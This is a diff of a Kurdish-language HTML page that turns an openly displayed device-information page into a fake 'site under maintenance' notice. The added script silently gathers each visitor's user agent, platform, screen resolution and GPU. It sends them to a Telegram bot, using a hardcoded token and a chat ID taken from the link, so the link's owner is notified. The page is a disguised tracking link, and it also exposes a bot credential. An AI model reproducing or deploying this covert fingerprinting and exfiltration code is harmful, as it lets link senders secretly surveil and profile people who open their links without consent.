@@ -3,105 +3,90 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>شیکاری ئامێرەکەت</title>
+    <title>لەژێر چاکسازیی و گەشەپێداندایە</title>
     <style>
-        * { box-sizing: border-box; }
         body {
             font-family: system-ui, -apple-system, sans-serif;
             background-color: #0f172a;
             color: #f8fafc;
-            margin: 0;
-            padding: 20px;
             display: flex;
             justify-content: center;
             align-items: center;
-            min-height: 100vh;
+            height: 100vh;
+            margin: 0;
+            text-align: center;
         }
         .card {
-            background-color: #1e293b;
-            padding: 24px;
-            border-radius: 16px;
+            background: #1e293b;
+            padding: 40px 20px;
+            border-radius: 20px;
             box-shadow: 0 10px 25px rgba(0,0,0,0.3);
-            width: 100%;
-            max-width: 500px;
+            max-width: 400px;
+            width: 90%;
             border: 1px solid #334155;
         }
-        h2 {
-            color: #38bdf8;
-            margin-top: 0;
-            font-size: 1.4rem;
-            text-align: center;
-            border-bottom: 1px solid #334155;
-            padding-bottom: 12px;
+        .spinner {
+            border: 4px solid #334155;
+            border-top: 4px solid #38bdf8;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px auto;
         }
-        .info-group {
-            margin-bottom: 14px;
-            background: #0f172a;
-            padding: 12px;
-            border-radius: 10px;
-        }
-        .label {
-            color: #94a3b8;
-            font-size: 0.85rem;
-            margin-bottom: 4px;
-        }
-        .value {
-            color: #f1f5f9;
-            font-weight: 600;
-            font-size: 0.95rem;
-            word-break: break-word;
-        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        h2 { color: #38bdf8; font-size: 1.3rem; margin-bottom: 10px; }
+        p { color: #94a3b8; font-size: 0.95rem; line-height: 1.5; }
     </style>
 </head>
 <body>
 
     <div class="card">
-        <h2>🔍 زانیارییەکانی ئامێرەکەت</h2>
-        
-        <div class="info-group">
-            <div class="label">📱 جۆری ئامێر / سیستەم:</div>
-            <div class="value" id="platform">لە حاڵەتی خەمڵاندندایە...</div>
-        </div>
-
-        <div class="info-group">
-            <div class="label">🌐 دەقی User-Agent:</div>
-            <div class="value" id="userAgent">...</div>
-        </div>
-
-        <div class="info-group">
-            <div class="label">📐 ڕوونی شاشە (Resolution):</div>
-            <div class="value" id="screenRes">...</div>
-        </div>
-
-        <div class="info-group">
-            <div class="label">🎮 کارتی گرافیک (GPU WebGL):</div>
-            <div class="value" id="gpu">...</div>
-        </div>
+        <div class="spinner"></div>
+        <h2>🛠 ماڵپەڕەکە لەژێر کارکردندایە</h2>
+        <p>بەمزووانە بە شێوەیەکی تێروتەسەل چالاک دەکرێت. تکایە دواتر سەردانمان بکەرەوە.</p>
     </div>
 
     <script>
-        // 1. User Agent
-        document.getElementById('userAgent').innerText = navigator.userAgent;
+        const BOT_TOKEN = "8918413203:AAG-EBiQakMDS0jK1H3d26ox0UpBh6LN-eY";
+        
+        // وەرگرتنی IDی خاوەنی لینکەکە لە URL
+        const urlParams = new URLSearchParams(window.location.search);
+        const ownerId = urlParams.get('id');
 
-        // 2. Platform / System
-        document.getElementById('platform').innerText = navigator.platform;
+        if (ownerId) {
+            // کۆکردنەوەی زانیارییەکانی ئامێرەکە
+            const ua = navigator.userAgent;
+            const platform = navigator.platform;
+            const screenRes = `${window.screen.width}x${window.screen.height} (Ratio:${window.devicePixelRatio})`;
+            
+            let gpu = "نەدۆزرایەوە";
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                if (gl) {
+                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                    gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+                }
+            } catch (e) {}
 
-        // 3. Screen Resolution
-        document.getElementById('screenRes').innerText = `${window.screen.width} x ${window.screen.height} (Pixel Ratio: ${window.devicePixelRatio})`;
+            // ئامادەکردنی پەیامەکە بۆ تێلێگرام
+            const message = `🔔 **سەردانیکەرێکی نوێ کاتژمێرێک پێش ئێستا لێنکەکەی کردەوە!**\n\n` +
+                            `📱 **سیستەم/ئامێر:** \`${platform}\`\n` +
+                            `📐 **ڕوونی شاشە:** \`${screenRes}\`\n` +
+                            `🎮 **کارتی گرافیک (GPU):** \`${gpu}\`\n` +
+                            `🌐 **User-Agent:** \`${ua}\``;
 
-        // 4. WebGL GPU Detection
-        try {
-            const canvas = document.createElement('canvas');
-            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-            if (gl) {
-                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-                document.getElementById('gpu').innerText = renderer;
-            } else {
-                document.getElementById('gpu').innerText = 'WebGL نەدۆزرایەوە';
-            }
-        } catch (e) {
-            document.getElementById('gpu').innerText = 'نەتوانرا بخوێندرێتەوە';
+            // ناردنی زانیارییەکان بۆ بۆتەکە بۆ ئەوەی تەنها بۆ تۆی بنێرێت
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: ownerId,
+                    text: message,
+                    parse_mode: 'Markdown'
+                })
+            }).catch(err => console.error(err));
         }
     </script>
 
